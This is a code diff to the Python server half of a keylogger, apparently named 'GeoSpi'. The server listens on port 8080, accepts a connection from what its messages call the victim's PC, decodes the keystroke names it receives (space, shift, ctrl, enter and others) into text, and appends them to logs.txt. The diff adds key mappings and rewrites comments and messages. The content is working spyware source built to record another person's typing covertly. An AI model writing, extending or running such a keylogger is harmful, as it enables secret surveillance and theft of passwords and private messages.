@@ -8,38 +8,51 @@ class Server:
         self.port = 8080
         self.server = s.socket()
 
-        # Bind ip and port to the server
+        # Bind ip and port to the socket
         self.server.bind((self.host, self.port))
         # Start the server
         self.set_server()
 
     def tras_data(self, data, file):
+        """
+        This function clear the data reviced from server
+        """
         if data == "Key.space":
             return " "
         elif data == "Key.shift":
             return "[S]>"
         elif data == "Key.backspace":
             return "<[D]"
+        elif data == "Key.ctrl":
+            return ">[CT]"
+        elif data == "Key.caps_lock":
+            return ">[CL]"
+        elif data == "Key.shift_r":
+            return "[TB]"
+        elif data == "Key.enter":
+            return "\n"
         data = data.removeprefix("'")
         data = data.removesuffix("'")
         return data
 
-    # Function to start server and start listen message from client
     def set_server(self):
+        """
+        This function start server and start listen message from client
+        """
         print("Server creato")
         self.server.listen()
         print("Server in ascolto")
         conn, add = self.server.accept()
         file = open("logs.txt", "a")
         i = True
-        print(f"<-----------Vittima trovata, connessione stabilita! info: {add}----------->")
+        print(f"<-----------Pc of victim found, GeoSpi in communication...\nInfo: {add}----------->")
         with file:
             with conn:
                 while True:
                     data = conn.recv(1024)
                     data = data.decode()
                     if not data:
-                        print("conn not valid")
+                        print("error in data, maybe client stop the connexion")
                         self.set_server()
                         break
                     if i:
